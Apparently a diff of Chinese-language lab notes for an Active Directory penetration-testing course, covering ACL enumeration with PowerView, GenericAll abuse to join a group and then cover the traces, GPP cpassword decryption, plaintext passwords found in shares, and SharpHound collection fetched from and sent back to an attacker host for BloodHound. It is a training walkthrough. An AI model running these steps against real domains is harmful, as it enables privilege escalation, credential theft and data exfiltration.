@@ -84,7 +84,7 @@ stephanie 是低權限使用者，但有 RDP 存取權限
 >**避免 Kerberos 雙重跳躍問題（[Kerberos Double-Hop](https://posts.slayerlabs.com/double-hop/) Issue）**:\
 建議使用 RDP，而非 PowerShell Remoting（WinRM），因為透過 WinRM 可能會導致 無法執行 AD 枚舉工具。\
 Kerberos 雙重跳躍（Double-Hop）問題 會影響某些遠端命令的執行權限，詳細內容可參考 PEN-300 課程。\
-![image](https://hackmd.io/_uploads/rynmdbookg.png)
+![image](https://hackmd.io/_uploads/HyDm7BhsJx.png)
 
 #### 2. 使用 net.exe 枚舉 AD 的使用者
 使用 `net user /domain` 來列出 corp.com 網域內的所有使用者
@@ -949,4 +949,435 @@ Address:  192.168.161.72
 >需要密碼登入
 
 ### Enumerating Object Permissions
+枚舉 Active Directory（AD）內的 Object 權限
+>[!Note]
+> **[Access Control List (ACL)](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists)**\
+> 在 AD 中，每個 Object 都有一組 存取控制清單（ACL，Access Control List），用來定義誰能存取該物件及擁有的權限。
+> - (1) ACL 的結構
+ACL 由多個 [Access Control Entry](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-entries)（ACE）組成。\
+每個 ACE 指定某個使用者或群組是否擁有該物件的某些權限。
+>- (2) 權限驗證流程
+當一個 使用者嘗試存取 AD 內的 Object，AD 會執行：\
+使用者提供 Access Token，其中包含該使用者的身分與權限資訊。\
+目標物件的 ACL 檢查該存取權杖，決定是否允許存取。
+
+>[!Important]
+>ACL 權限:\
+>![image](https://hackmd.io/_uploads/SJ6Zs42s1e.png)
+
+#### 1. 使用 PowerView 枚舉 AD Object 的 ACL
+使用 PowerView 的 `Get-ObjectAcl` 檢查 AD 物件的權限
+```
+PS C:\Tools> Get-ObjectAcl -Identity stephanie
+
+...
+ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
+ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
+ActiveDirectoryRights  : ReadProperty
+ObjectAceFlags         : ObjectAceTypePresent
+ObjectAceType          : 4c164200-20c0-11d0-a768-00aa006e0529
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
+BinaryLength           : 56
+AceQualifier           : AccessAllowed
+IsCallback             : False
+OpaqueLength           : 0
+AccessMask             : 16
+SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553
+AceType                : AccessAllowedObject
+AceFlags               : None
+IsInherited            : False
+InheritanceFlags       : None
+PropagationFlags       : None
+AuditFlags             : None
+...
+```
+> `ObjectSID`：stephanie 的 [Security Identifiers](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers) （SID）\
+`ActiveDirectoryRights`：ReadProperty（允許讀取屬性）\
+`SecurityIdentifier`：此權限授予 S-1-5-21-...-553。
+
+#### 2. 轉換 SID 為可讀名稱
+可以用 `Convert-SidToName` 來 轉換為可讀的名稱
+```
+PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
+CORP\stephanie
+PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
+CORP\RAS and IAS Servers
+```
+> 表示 `RAS and IAS Servers` group 擁有對 stephanie 的 讀取權限
+
+根據 PowerView，SecurityIdentifier 屬性中的 SID 屬於 [RAS and IAS Servers](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#ras-and-ias-servers) 的預設 AD 群組。
+
+#### 3. 尋找擁有 GenericAll 權限的帳號 (最高權限)
+使用 PowerView 查詢 具有最高權限（GenericAll）的帳號
+```
+PS C:\Tools> Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+
+SecurityIdentifier                            ActiveDirectoryRights
+------------------                            ---------------------
+S-1-5-21-1987370270-658905905-1781884369-512             GenericAll
+S-1-5-21-1987370270-658905905-1781884369-1104            GenericAll
+S-1-5-32-548                                             GenericAll
+S-1-5-18                                                 GenericAll
+S-1-5-21-1987370270-658905905-1781884369-519             GenericAll
+
+PS C:\Tools> "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
+CORP\Domain Admins
+CORP\stephanie
+BUILTIN\Account Operators
+Local System
+CORP\Enterprise Admins
+```
+>以下對象擁有 GenericAll 權限：\
+`S-1-5-21-...-512` → Domain Admins\
+`S-1-5-21-...-1104` → stephanie\
+`S-1-5-32-548` → Account Operators\
+`S-1-5-18` → Local System\
+`S-1-5-21-...-519` → Enterprise Admins
+>> stephanie 也有 GenericAll 權限 ?!\
+>> ![image](https://hackmd.io/_uploads/HJAW7S2jkx.png)
+
+#### 4. 嘗試提權
+當我們觀察 Management Department 時，只發現 `jen` 是唯一的成員\
+利用 GenericAll 權限，透過 net.exe 將 stephanie 加入 Management Department 群組，取得更高權限
+```
+PS C:\Tools> net group "Management Department" stephanie /add /domain
+The request will be processed at a domain controller for domain corp.com.
+
+The command completed successfully.
+```
+驗證 stephanie 是否成功加入
+```
+PS C:\Tools> Get-NetGroup "Management Department" | select member
+
+member
+------
+{CN=jen,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}
+```
+> 成功將 stephanie 加入 Management Department
+
+#### 5. 清除復原痕跡
+```
+PS C:\Tools> net group "Management Department" stephanie /del /domain
+PS C:\Tools> Get-NetGroup "Management Department" | select member
+```
+
+### Enumerating Domain Shares
+網域共享資料夾（Domain Shares） 通常用來 儲存組織內部的文件、程式和設定檔案\
+attacker 可以透過這些共享資料夾找到關鍵資訊，例如：Password, Domain Configuration, Scripts 等機密文件。
+#### 1. 使用 PowerView 查找共享資料夾
+使用 PowerView 的 `Find-DomainShare` 來列出所有網域內的共享資料夾
+```
+PS C:\Tools> Find-DomainShare
+
+Name           Type Remark                 ComputerName
+----           ---- ------                 ------------
+ADMIN$   2147483648 Remote Admin           DC1.corp.com
+C$       2147483648 Default share          DC1.corp.com
+IPC$     2147483651 Remote IPC             DC1.corp.com
+NETLOGON          0 Logon server share     DC1.corp.com
+SYSVOL            0 Logon server share     DC1.corp.com
+ADMIN$   2147483648 Remote Admin           web04.corp.com
+backup            0                        web04.corp.com
+C$       2147483648 Default share          web04.corp.com
+IPC$     2147483651 Remote IPC             web04.corp.com
+ADMIN$   2147483648 Remote Admin           FILES04.corp.com
+C                 0                        FILES04.corp.com
+C$       2147483648 Default share          FILES04.corp.com
+docshare          0 Documentation purposes FILES04.corp.com
+IPC$     2147483651 Remote IPC             FILES04.corp.com
+Tools             0                        FILES04.corp.com
+Users             0                        FILES04.corp.com
+Windows           0                        FILES04.corp.com
+ADMIN$   2147483648 Remote Admin           client74.corp.com
+C$       2147483648 Default share          client74.corp.com
+IPC$     2147483651 Remote IPC             client74.corp.com
+ADMIN$   2147483648 Remote Admin           client75.corp.com
+C$       2147483648 Default share          client75.corp.com
+IPC$     2147483651 Remote IPC             client75.corp.com
+sharing           0                        client75.corp.com
+ADMIN$   2147483648 Remote Admin           CLIENT76.corp.com
+C$       2147483648 Default share          CLIENT76.corp.com
+IPC$     2147483651 Remote IPC             CLIENT76.corp.comip
+```
+> `SYSVOL` 和 `NETLOGON` 是預設的共享資料夾，通常存放 Group Policy 和 Logon Scripts\
+`backup`、`docshare` 和 `sharing` 可能存放機密資訊
+
+#### 2. 解析 `SYSVOL` 共享資料夾
+```
+PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\
+
+    Directory: \\dc1.corp.com\sysvol\corp.com
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         9/21/2022   1:11 AM                Policies
+d-----          9/2/2022   4:08 PM                scripts
+
+PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\Policies\
+
+    Directory: \\dc1.corp.com\sysvol\corp.com\Policies
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         9/21/2022   1:13 AM                oldpolicy
+d-----          9/2/2022   4:08 PM                {31B2F340-016D-11D2-945F-00C04FB984F9}
+d-----          9/2/2022   4:08 PM                {6AC1786C-016F-11D2-945F-00C04fB984F9}
+```
+看一下 oldpolicy
+```
+PS C:\Tools> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
+<?xml version="1.0" encoding="utf-8"?>
+<Groups   clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
+  <User   clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
+          name="Administrator (built-in)"
+          image="2"
+          changed="2012-05-03 11:45:20"
+          uid="{253F4D90-150A-4EFB-BCC8-6E894A9105F7}">
+    <Properties
+          action="U"
+          newName=""
+          fullName="admin"
+          description="Change local admin"
+          cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+          changeLogon="0"
+```
+> `cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"` 加密密碼\
+>> 這種加密密碼通常來自於 GPP（[Group Policy Preferences](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922(v=ws.11))），有機會被解密
+
+>[!Tip]
+>在 Windows 以前的版本中，系統管理員常用 GPP 來修改本機管理員密碼，但 GPP 密碼是使用已知金鑰加密的（AES-256）。
+
+#### 3. 解密 GPP Password
+使用 [gpp-decrypt](https://www.kali.org/tools/gpp-decrypt/) 解密
+```
+┌──(chw㉿CHW)-[~]
+└─$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+P@$$w0rd
+```
+> AD 內部內建管理員的密碼
+
+#### - 檢查其他共享資料夾
+##### (1) docshare 共享資料夾
+```
+PS C:\Tools> ls \\FILES04\docshare\
+
+
+    Directory: \\FILES04\docshare
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         9/21/2022   2:02 AM                docs
+
+
+PS C:\Tools> ls \\FILES04\docshare\docs\
+
+
+    Directory: \\FILES04\docshare\docs
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         9/21/2022   2:01 AM                do-not-share
+-a----         9/21/2022   2:03 AM            242 environment.txt
+
+PS C:\Tools> ls \\FILES04\docshare\docs\do-not-share\
+
+
+    Directory: \\FILES04\docshare\docs\do-not-share
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         9/21/2022   2:02 AM           1142 start-email.txt
+```
+查看 `\docs\do-not-share\start-email.txt`
+```
+PS C:\Tools> cat \\FILES04\docshare\docs\do-not-share\start-email.txt
+Hi Jeff,
+
+...
+The username I'm sure you already know, but here you have the brand new auto generated password as well: HenchmanPutridBonbon11
+
+...
+
+Best Regards
+Stephanie
+
+...............
+
+
+Hey Stephanie,
+
+...
+
+Best regards
+Jeff
+```
+>這封電子郵件 包含 jeff 的明文密碼: HenchmanPutridBonbon11
+
+## Active Directory - Automated Enumeration
+如何 自動化 Active Directory（AD）枚舉，透過 [SharpHound](https://support.bloodhoundenterprise.io/hc/en-us/articles/17481151861019-SharpHound-Community-Edition) 來收集網域資料，並使用 [BloodHound](https://support.bloodhoundenterprise.io/hc/en-us) 來分析這些資料
+### Collecting Data with SharpHound
+>[!Note]
+>[SharpHound](https://support.bloodhoundenterprise.io/hc/en-us/articles/17481151861019-SharpHound-Community-Edition)\
+SharpHound 是 BloodHound 的資料收集工具，它是一個用 C# 編寫的工具，可以透過：
+>- Windows API
+>- LDAP 查詢
+>- [NetWkstaUserEnum](https://learn.microsoft.com/en-us/windows/win32/api/lmwksta/nf-lmwksta-netwkstauserenum) 和 [NetSessionEnum](https://learn.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum)（獲取已登入的使用者）
+>- 遠端登錄（Remote Registry）
+
+SharpHound 主要收集的內容包括：
+- 使用者與群組資訊（User & Group）
+- 本機管理員權限（Local Admin）
+- GPO 本機群組（Group Policy Objects）
+- 遠端桌面權限（RDP）
+- 服務主體名稱（SPN）
+- 系統 ACL（權限控制清單）
+- 遠端 PowerShell 連線（PSRemote）
+- 信任關係（Trusts）
+- 已登入的使用者（LoggedOn Users）
+
+收集到的資料後會儲存為 JSON 格式，並打包成 .zip 檔
+
+#### 1. 下載並傳送 SharpHound
+Kali Linux 下載最新版本的 SharpHound
+```
+┌──(chw㉿CHW)-[~]
+└─$ wget https://github.com/SpecterOps/SharpHound/releases/download/v2.6.0/SharpHound-v2.6.0.zip
+┌──(chw㉿CHW)-[~]
+└─$ unzip SharpHound-v2.6.0.zip -d SharpHound
+┌──(chw㉿CHW)-[~/SharpHound]
+└─$ ls                       
+SharpHound.exe  SharpHound.exe.config  SharpHound.pdb  SharpHound.ps1
+┌──(chw㉿CHW)-[~/SharpHound]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+在 Kali Linux 下載最新版本的 SharpHound，並將 `Sharphound.ps1` 傳送到目標機器
+```
+PS C:\Users\stephanie\Downloads>  iwr -uri http://192.168.45.159/SharpHound.ps1 -Outfile SharpHound.ps1
+```
+#### 2. 啟用 SharpHound
+```
+PS C:\Users\stephanie\Downloads> powershell -ep bypass
+PS C:\Users\stephanie\Downloads> . .\SharpHound.ps1
+PS C:\Users\stephanie\Downloads> Get-Help Invoke-BloodHound
+
+NAME
+    Invoke-BloodHound
+
+SYNOPSIS
+    Runs the BloodHound C# Ingestor using reflection. The assembly is stored in this file.
+
+
+SYNTAX
+    Invoke-BloodHound [-CollectionMethods <String[]>] [-Domain <String>] [-SearchForest] [-Stealth] [-LdapFilter
+    <String>] [-DistinguishedName <String>] [-ComputerFile <String>] [-OutputDirectory <String>] [-OutputPrefix
+    <String>] [-CacheName <String>] [-MemCache] [-RebuildCache] [-RandomFilenames] [-ZipFilename <String>] [-NoZip]
+    [-ZipPassword <String>] [-TrackComputerCalls] [-PrettyPrint] [-LdapUsername <String>] [-LdapPassword <String>]
+    [-DomainController <String>] [-LdapPort <Int32>] [-SecureLdap] [-DisableCertVerification] [-DisableSigning]
+    [-SkipPortCheck] [-PortCheckTimeout <Int32>] [-SkipPasswordCheck] [-ExcludeDCs] [-Throttle <Int32>] [-Jitter
+    <Int32>] [-Threads <Int32>] [-SkipRegistryLoggedOn] [-OverrideUsername <String>] [-RealDNSName <String>]
+    [-CollectAllProperties] [-Loop] [-LoopDuration <String>] [-LoopInterval <String>] [-StatusInterval <Int32>]
+    [-Verbosity <Int32>] [-Help] [-Version] [<CommonParameters>]
+
+
+DESCRIPTION
+    Using reflection and assembly.load, load the compiled BloodHound C# ingestor into memory
+    and run it without touching disk. Parameters are converted to the equivalent CLI arguments
+    for the SharpHound executable and passed in via reflection. The appropriate function
+    calls are made in order to ensure that assembly dependencies are loaded properly.
+
+
+RELATED LINKS
+
+REMARKS
+    To see the examples, type: "get-help Invoke-BloodHound -examples".
+    For more information, type: "get-help Invoke-BloodHound -detailed".
+    For technical information, type: "get-help Invoke-BloodHound -full".
+```
+Get-Help 了解指令
+
+#### 3. SharpHound 進行 Active Directory 枚舉
+```
+PS C:\Users\stephanie\Downloads> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit
+...
+2025-03-10T08:46:06.5021580-07:00|INFORMATION|Status: 309 objects finished (+309 309)/s -- Using 140 MB RAM
+...
+```
+>`-CollectionMethod All`：所有可用的 Active Directory 資訊\
+`-OutputDirectory C:\Users\stephanie\Desktop\`：將結果存放到 桌面\
+`-OutputPrefix "corp audit"`：輸出檔案的名稱前綴
+>> 總共掃描了 309 個 Object
+
+列出 SharpHound 產生的檔案：
+```
+PS C:\Users\stephanie\Downloads> ls C:\Users\stephanie\Desktop\
+
+
+    Directory: C:\Users\stephanie\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         3/10/2025   8:46 AM          28113 corp audit_20250310084605_BloodHound.zip
+-a----         3/10/2025   8:46 AM           2050 ZTZjMzY2NTMtZjZiOS00YmY4LTk1ZmMtMDE5MjQxN2ZkYTZj.bin
+```
+> 用 BloodHound 來分析的 AD 結構與權限關係
+
+>[!Note]
+> SharpHound 可以使用 Loop 觀察長時間 domain 中發生的變化:
+> ```
+> Invoke-BloodHound -CollectionMethod All -Loop -LoopDuration 2h -LoopInterval 5m -OutputDirectory C:\Users\stephanie\Desktop\
+> ```
+> `-Loop`：啟用循環收集\
+`-LoopDuration 2h`：執行 2 小時\
+`-LoopInterval 5m`：每 5 分鐘 進行一次收集
+
+### Analysing Data using BloodHound
+BloodHound 依賴 [Neo4j](https://neo4j.com/) (一種圖形資料庫) 來儲存和分析 AD 資料。在 Kali Linux 中，Neo4j 是 APT 安裝 BloodHound 時自動安裝的
+#### 1. 啟動 Neo4j 資料庫
+```
+┌──(chw㉿CHW)-[~]
+└─$ sudo neo4j start           
+Directories in use:
+home:         /usr/share/neo4j
+config:       /usr/share/neo4j/conf
+logs:         /etc/neo4j/logs
+plugins:      /usr/share/neo4j/plugins
+import:       /usr/share/neo4j/import
+data:         /etc/neo4j/data
+certificates: /usr/share/neo4j/certificates
+licenses:     /usr/share/neo4j/licenses
+run:          /var/lib/neo4j/run
+Starting Neo4j.
+Started neo4j (pid:1880421). It is available at http://localhost:7474
+There may be a short delay until the server is ready.
+
+```
+透過瀏覽器開啟 http://localhost:7474 登入 Neo4j，預設帳號/密碼為：`neo4j`/`neo4j`\
+![image](https://hackmd.io/_uploads/rJyC0K2ikx.png)
+
+#### 2. 啟動 BloodHound
+```
+┌──(chw㉿CHW)-[~]
+└─$ bloodhound
+(node:1884189) electron: The default of contextIsolation is deprecated and will be changing from false to true in a future release of Electron.  See https://github.com/electron/electron/issues/23506 for more information
+(node:1884237) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.
+
+```
+打開 BloodHound UI，並要求我們輸入 Neo4j 的帳號密碼 來登入資料庫\
+![image](https://hackmd.io/_uploads/B1jukqhokg.png)
+
+#### 3. 上傳 SharpHound 收集的資料
+透過 scp 傳回 Kali
+```
+PS C:\Users\stephanie\Desktop> scp "C:\Users\stephanie\Desktop\corp audit_20250310084605_BloodHound.zip" chw@192.168.45.159:~/corp_audit.zip
+chw@192.168.45.159's password:
+corp audit_20250310084605_BloodHound.zip                                              100%   27KB 146.4KB/s   00:00
+PS C:\Users\stephanie\Desktop>
+```
+在 BloodHound 上傳 `.zip`\
+![image](https://hackmd.io/_uploads/rJVWmcnoye.png)
 
